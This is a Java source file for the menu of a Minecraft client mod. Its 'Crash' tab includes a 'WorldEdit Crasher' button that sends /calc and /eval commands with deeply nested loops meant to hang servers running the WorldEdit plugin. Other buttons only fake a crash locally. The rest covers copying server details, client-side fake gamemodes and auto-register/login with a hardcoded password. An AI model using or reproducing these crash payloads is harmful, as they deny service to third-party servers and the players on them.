package de.javafunction.meta.gui;

import de.javafunction.meta.MetaClient;
import de.javafunction.meta.imgui.ImGuiImpl;
import de.javafunction.meta.utils.ChatUtil;
import imgui.ImGui;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.text.Text;
import net.minecraft.world.GameMode;

import javax.swing.*;

import static imgui.flag.ImGuiCol.*;

public class ClickGUI extends Screen {
    public ClickGUI(Text title) {
        super(title);
    }

    @Override
    public void render(DrawContext context, int mouseX, int mouseY, float delta) {
        ImGuiImpl.draw(io -> {
            if (ImGui.begin("META")) {
                if (ImGui.beginTabBar("meta_tab_Crasher")) {
                    if (ImGui.beginTabItem("Crash")) {
                        if (ImGui.button("Crasher", 100 * 4, 24)) {
                            MinecraftClient.getInstance().getNetworkHandler().unloadWorld();
                            ChatUtil.ClientMessage("§aCrashing...");
                        }

                        if (ImGui.button("Permitted Crasher", 100 * 4, 24)) {
                            MinecraftClient.getInstance().getNetworkHandler().unloadWorld();
                            for (int i = 0; i < 20; i++) {
                                ChatUtil.ClientMessageNP("§4You are not permitted to interact with §cUNKNOWN_ITEM");
                            }
                        }

                        if (ImGui.button("WorldEdit Crasher", 100 * 4, 24)) {
                            ChatUtil.Command("worldedit:/calc for(i=0;i<256;i++){for(b=0;b<256;b++){for(h=0;b<256;h++){for(n=0;n<256;n++){}}}}");
                            ChatUtil.Command("/eval for(i=0;i<256;i++){for(b=0;i<256;b++){for(h=0;b<256;h++){for(n=0;n<256;n++){sin(n)}}}}");
                            ChatUtil.ClientMessage("§aCrashing...");
                        }
/*                        if (ImGui.button("PlotSquared Crasher", 100 * 4, 24)) {
                            ChatUtil.ClientMessage("§aCrashing...");
                            MinecraftClient.getInstance().getNetworkHandler().unloadWorld();
                            ChatUtil.ClientMessageNP("§8[§6P2§8] §cAn internal error occured while attempting to perform this command");
                            ChatUtil.ClientMessageNP("§8[§6P2§8] §cAn internal error occured while attempting to perform this command");
                            ChatUtil.ClientMessageNP("§8[§6P2§8] §cAn internal error occured while attempting to perform this command");
                        }
*/

                        ImGui.endTabItem();
                    }

                    ImGui.endTabBar();
                }
                if (ImGui.beginTabBar("meta_tab_Misc")) {
                    if (ImGui.beginTabItem("Misc")) {
                        if (ImGui.button("CopyIP", 100 * 4, 24)) {
                            MinecraftClient.getInstance().keyboard.setClipboard(MinecraftClient.getInstance().getCurrentServerEntry().address);
                            ChatUtil.ClientMessage("§aIP Copied!");
                        }
                        if (ImGui.button("Copy IGN", 100 * 4, 24)) {
                            MinecraftClient.getInstance().keyboard.setClipboard(MinecraftClient.getInstance().player.getName().getString());
                            ChatUtil.ClientMessage("§aIGN Copied!");
                        }
                        if (ImGui.button("CopyServer", 100 * 4, 24)) {
                            MinecraftClient.getInstance().keyboard.setClipboard("IP: " + MinecraftClient.getInstance().getCurrentServerEntry().address + ", VERSION: " + MinecraftClient.getInstance().getCurrentServerEntry().version.getString() + ", BRAND: " + MinecraftClient.getInstance().getNetworkHandler().getBrand().toString() + ", PING: " + MinecraftClient.getInstance().getCurrentServerEntry().ping);
                            ChatUtil.ClientMessage("§aServer-Infos Copied!");
                        }
                        if (ImGui.button("Register", 100 * 4, 24)) {
                            ChatUtil.Command("register HOIUAH&(//$$a12384 HOIUAH&(//$$a12384");
                        }
                        if (ImGui.button("Login", 100 * 4, 24)) {
                            ChatUtil.Command("login HOIUAH&(//$$a12384");
                        }
                        ImGui.endTabItem();
                    }
                    ImGui.endTabBar();
                }
                if (ImGui.beginTabBar("meta_tab_FakeGM")) {
                    if (ImGui.beginTabItem("Fake Gamemode")) {
                        if (ImGui.button("CREATIVE", 100 * 4, 24)) {
                            MinecraftClient.getInstance().interactionManager.setGameMode(GameMode.CREATIVE);
                        }
                        if (ImGui.button("ADVENTURE", 100 * 4, 24)) {
                            MinecraftClient.getInstance().interactionManager.setGameMode(GameMode.ADVENTURE);
                        }
                        if (ImGui.button("SPECTATOR", 100 * 4, 24)) {
                            MinecraftClient.getInstance().interactionManager.setGameMode(GameMode.SPECTATOR);
                        }
                        if (ImGui.button("SURVIVAL", 100 * 4, 24)) {
                            MinecraftClient.getInstance().interactionManager.setGameMode(GameMode.SURVIVAL);
                        }
                        ImGui.endTabItem();
                    }
                    ImGui.endTabBar();
                }
                if (ImGui.beginTabBar("meta_tab_fun")) {
                    if (ImGui.beginTabItem("FUN")) {
                        if (ImGui.button("GrafTrain", 100 * 4, 24)) {
                            MetaClient.getInstance().hud.GrafTrain = true;
                        }
                        if (ImGui.button("Minigame", 100 * 4, 24)) {
                            ChatUtil.ClientMessage("§asoon...");
                        }
                        ImGui.endTabItem();
                    }
                    ImGui.endTabBar();
                }
                    ImGui.end();
            }

            ImGui.showDemoWindow();
        });
    }
}
